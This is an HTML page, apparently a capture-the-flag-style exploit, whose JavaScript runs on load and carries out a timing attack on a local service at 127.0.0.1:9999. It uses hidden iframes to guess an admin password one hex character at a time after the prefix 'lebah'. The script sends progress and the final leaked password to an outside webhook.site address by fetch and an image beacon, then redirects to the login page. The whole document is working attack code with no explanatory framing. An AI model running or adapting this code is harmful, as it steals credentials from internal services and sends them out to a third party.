<!DOCTYPE html>
<html>
<head><title>Timing Attack</title></head>
<body>
<h1>Timing-based password leak...</h1>
<pre id="output"></pre>
<div id="container" style="position:absolute;left:-9999px;"></div>
<script>
const output = document.getElementById('output');
const container = document.getElementById('container');
const TARGET = 'https://127.0.0.1:9999/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah';

// Timing threshold: >400ms = match, <300ms = no match
const THRESHOLD_MS = 400;

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

async function measureTiming(pass) {
    return new Promise((resolve) => {
        const start = performance.now();
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = TARGET + '?pass=' + encodeURIComponent(pass);
        
        let resolved = false;
        
        const cleanup = () => {
            if (iframe.parentNode) {
                container.removeChild(iframe);
            }
        };
        
        // Timeout after 1 second
        const timeout = setTimeout(() => {
            if (!resolved) {
                const elapsed = performance.now() - start;
                cleanup();
                resolved = true;
                resolve({ pass, elapsed, isMatch: elapsed > THRESHOLD_MS });
            }
        }, 1000);
        
        iframe.onload = () => {
            if (!resolved) {
                const elapsed = performance.now() - start;
                clearTimeout(timeout);
                cleanup();
                resolved = true;
                resolve({ pass, elapsed, isMatch: elapsed > THRESHOLD_MS });
            }
        };
        
        iframe.onerror = () => {
            if (!resolved) {
                const elapsed = performance.now() - start;
                clearTimeout(timeout);
                cleanup();
                resolved = true;
                resolve({ pass, elapsed, isMatch: false });
            }
        };
        
        container.appendChild(iframe);
    });
}

async function leakPassword() {
    log('[*] TIMING-BASED password leak attack!');
    log('[*] Known prefix: ' + knownPassword);
    log('[*] Timing oracle: >400ms = match, <300ms = no match\n');
    
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=timing_attack_started').catch(e=>{});
    
    // Leak 12 hex chars
    for (let pos = 0; pos < 12; pos++) {
        log(`[*] Position ${pos+1}/12...`);
        let found = false;
        
        for (let c of CHARSET) {
            const candidate = knownPassword + c;
            const result = await measureTiming(candidate);
            
            log(`  "${c}": ${result.elapsed.toFixed(0)}ms ${result.isMatch ? 'âœ“ MATCH!' : ''}`);
            
            if (result.isMatch) {
                knownPassword = candidate;
                log(`  [+] Found char '${c}' -> ${knownPassword}\n`);
                
                // Send progress
                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
                
                found = true;
                break;
            }
        }
        
        if (!found) {
            log(`[-] No match at position ${pos+1}!`);
            break;
        }
    }
    
    log('\n========================================');
    log('LEAKED ADMIN PASSWORD: ' + knownPassword);
    log('========================================');
    
    // Final exfiltration
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
    new Image().src = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?pass=' + encodeURIComponent(knownPassword);
    
    log('\n[*] Password exfiltrated! Check webhook.');
    
    // Try to login with leaked password
    log('\n[*] Attempting login...');
    setTimeout(() => {
        window.location.href = TARGET + '/login';
    }, 2000);
}

setTimeout(leakPassword, 500);
</script>
</body>
</html>
